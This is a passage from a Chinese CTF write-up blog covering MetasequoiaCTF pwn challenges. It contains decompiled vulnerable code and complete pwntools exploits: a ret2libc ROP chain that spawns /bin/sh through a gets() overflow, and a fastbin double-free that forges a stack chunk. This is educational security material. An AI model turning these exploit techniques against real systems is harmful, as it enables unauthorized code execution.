&#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line">sla(<span class="string">'&gt; '</span>,<span class="string">'summon aaaaaaaa\5'</span>) </span><br><span class="line">sla(<span class="string">'&gt; '</span>,<span class="string">'release'</span>)</span><br><span class="line">sla(<span class="string">'&gt; '</span>,<span class="string">'summon aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)</span><br><span class="line">sla(<span class="string">'&gt; '</span>,<span class="string">'strike'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><p>超级详细的<a href="https://github.com/SignorMercurio/MetasequoiaCTF/tree/master/Pwn/Summoner" target="_blank" rel="noopener">Summoner</a>解析</p>
<h2 id="demon-dragon"><a href="#demon-dragon" class="headerlink" title="demon_dragon"></a>demon_dragon</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>在Demon Dragon的巢穴入口，你遇到了一位女巫。<br>女巫说： 金克木，木克土，土克水，水克火，火克金。<br>By <em>Mercurio</em>                            </p>
</blockquote>
</li>
<li><p>题目附件：</p>
<blockquote>
<p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/DemonDragon/demon_dragon" target="_blank" rel="noopener">demon_dragon</a><br><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/DemonDragon/libmagic.so" target="_blank" rel="noopener">libmagic.so</a></p>
</blockquote>
</li>
<li><p>考察点：动态链接？栈溢出</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>初始分值：300</p>
</li>
<li><p>最终分值：299</p>
</li>
<li><p>完成人数：2</p>
</li>
</ul>
<h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><p>需要加载附件给的动态库，直接扔到<code>/lib</code>目录下即可在本地运行程序。</p>
<p>动态库里有乱七八糟一堆函数，都没有什么用，下面这个函数里有很明显的栈溢出，直接<code>ROP</code>带走即可</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400C41</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Suddenly, the Demon Dragon attacked you with %s, %s, %s, %s, %s!\n\n"</span>,</span><br><span class="line">    (<span class="keyword">char</span> *)v2 + <span class="number">6</span> * dword_6020B0,</span><br><span class="line">    (<span class="keyword">char</span> *)v2 + <span class="number">6</span> * dword_6020B4,</span><br><span class="line">    (<span class="keyword">char</span> *)v2 + <span class="number">6</span> * dword_6020B8,</span><br><span class="line">    (<span class="keyword">char</span> *)v2 + <span class="number">6</span> * dword_6020BC,</span><br><span class="line">    (<span class="keyword">char</span> *)v2 + <span class="number">6</span> * dword_6020C0);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What are you going to do?!!\nSkill &gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./demon_dragon'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x0000000000400e43</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">main = <span class="number">0x00400D6E</span></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">72</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += p64(prdi) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.sym[<span class="string">'puts'</span>]) + p64(main)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Skill &gt; '</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line">puts = uu64(rc(<span class="number">6</span>))</span><br><span class="line">info_addr(<span class="string">'puts'</span>,puts)</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info_addr(<span class="string">'base'</span>,libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop2</span></span><br><span class="line">ru(<span class="string">'Skill &gt; '</span>)</span><br><span class="line">payload2 = <span class="string">'B'</span>*offset</span><br><span class="line">payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)</span><br><span class="line">debug()</span><br><span class="line">sl(payload2)</span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="Samsara"><a href="#Samsara" class="headerlink" title="Samsara"></a>Samsara</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>在击败Demon Dragon后，你终于也变成了Demon Dragon……<br>By <em>Mercurio</em>     </p>
</blockquote>
</li>
<li><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Samsara/samsara" target="_blank" rel="noopener">题目附件</a></p>
</li>
<li><p>考察点：double free</p>
</li>
<li><p>难度：中等</p>
</li>
<li><p>初始分值：300</p>
</li>
<li><p>最终分值：299</p>
</li>
<li><p>完成人数：2</p>
</li>
</ul>
<h3 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h3><p>菜单题，输入1创建大小为8的chunk，输入2将其释放，输入3可修改任意chunk数据，输入4打印变量<code>v9</code>地址，输入5可修改<code>v9</code>的值，输入6时判断变量<code>v10</code>，当<code>v10==0xDEADBEEF</code>时给flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>&#123;</span><br><span class="line">  __int64 *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">__gid_t</span> rgid; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  v3 = (__int64 *)rgid;</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  v4 = <span class="string">"After defeating the Demon Dragon, you turned yourself into the Demon Dragon..."</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"After defeating the Demon Dragon, you turned yourself into the Demon Dragon..."</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> ) &#123;</span><br><span class="line">    v12 = <span class="number">0L</span>L;</span><br><span class="line">    sub_A50(v4, v3);</span><br><span class="line">    v3 = (__int64 *)&amp;v6;</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)off_F70 )&#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:                                  <span class="comment">// capture</span></span><br><span class="line">        <span class="keyword">if</span> ( i &gt;= <span class="number">7</span> )&#123;</span><br><span class="line">          v4 = <span class="string">"You can't capture more people."</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"You can't capture more people."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          v5 = i;</span><br><span class="line">          people[v5] = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">          ++i;</span><br><span class="line">          v4 = <span class="string">"Captured."</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Captured."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:                                  <span class="comment">// eat</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Index:"</span>);</span><br><span class="line">        v3 = (__int64 *)&amp;v7;</span><br><span class="line">        _isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">        <span class="built_in">free</span>(people[v7]);</span><br><span class="line">        v4 = <span class="string">"Eaten."</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Eaten."</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:                                  <span class="comment">// cook</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Index:"</span>);</span><br><span class="line">        _isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Ingredient:"</span>);</span><br><span class="line">        v3 = &amp;v12;</span><br><span class="line">        _isoc99_scanf(<span class="string">"%llu"</span>, &amp;v12);</span><br><span class="line">        *(_QWORD *)people[v7] = v12;</span><br><span class="line">        v4 = <span class="string">"Cooked."</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Cooked."</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:                                  <span class="comment">// show</span></span><br><span class="line">        v3 = &amp;v9;</span><br><span class="line">        v4 = <span class="string">"Your lair is at: %p\n"</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Your lair is at: %p\n"</span>, &amp;v9);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:                                  <span class="comment">// move</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Which kingdom?"</span>);</span><br><span class="line">        v3 = &amp;v11;</span><br><span class="line">        _isoc99_scanf(<span class="string">"%llu"</span>, &amp;v11);</span><br><span class="line">        v9 = v11;</span><br><span class="line">        v4 = <span class="string">"Moved."</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Moved."</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:                                  <span class="comment">// flag</span></span><br><span class="line">        <span class="keyword">if</span> ( v10 == <span class="number">0xDEADBEEF</span>LL )</span><br><span class="line">          system(<span class="string">"cat flag"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Now, there's no Demon Dragon anymore..."</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>在栈上伪造chunk，然后利用<code>double free</code>分配一个位于<code>v9-8</code>的chunk，输入3修改这个chunk，被修改的地址为<code>v9-8+16 = v10</code>，向其中写<code>0xdeadbeef</code>即可getflag</p>
<p>输入4修改<code>v9</code>的值为<code>0x21</code>即可伪造chunk，不伪造chunk的话，<code>malloc</code>会报错</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk+0:  v9-8:xxx      v9: 0x21</span><br><span class="line">chunk+8:  v10: 0x0      xxxxxxxx</span><br></pre></td></tr></table></figure></div>

<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./samsara'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">capture</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">'Index:\n'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cook</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    sla(<span class="string">'Index:\n'</span>,str(index))</span><br><span class="line">    sla(<span class="string">'Ingredient:\n'</span>,str(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'Your lair is at: '</span>)</span><br><span class="line">    <span class="keyword">return</span> eval(rc(<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(data)</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'5'</span>)</span><br><span class="line">    sla(<span class="string">'Which kingdom?\n'</span>,str(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">commit</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line">ptr = show()</span><br><span class="line">info_addr(<span class="string">'ptr'</span>,ptr)</span><br><span class="line">move(<span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line">capture() <span class="comment"># 0</span></span><br><span class="line">capture() <span class="comment"># 1</span></span><br><span class="line">capture() <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">eat(<span class="number">0</span>)</span><br><span class="line">eat(<span class="number">1</span>)</span><br><span class="line">eat(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">capture()   <span class="comment"># 3</span></span><br><span class="line">cook(<span class="number">0</span>,ptr<span class="number">-0x8</span>) </span><br><span class="line">capture()   <span class="comment"># 4</span></span><br><span class="line">capture()   <span class="comment"># 5 </span></span><br><span class="line">capture()   <span class="comment"># 6 </span></span><br><span class="line">cook(<span class="number">6</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">commit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h3 id="官方wp-1"><a href="#官方wp-1" class="headerlink" title="官方wp"></a>官方wp</h3><p>官方wp讲解的很详细啊，摘录过来：D</p>
<blockquote>
<p>逆向可以知道每次抓人都执行<code>malloc(8)</code>，我们不能控制分配的大小。那么在释放的时候，chunk必定进入fastbin。操作3就是编辑chunk的内容，不存在溢出。但是这题有两个奇怪的操作：输入4会打印出栈上变量<code>lair</code>的位置，输入5会改变<code>lair</code>的值。最后，退出程序时，检查栈上变量<code>target</code>是否等于<code>0xdeadbeef</code>，如果等于就能getflag，但是整个程序中不存在对<code>target</code>的任何读写操作。</p>
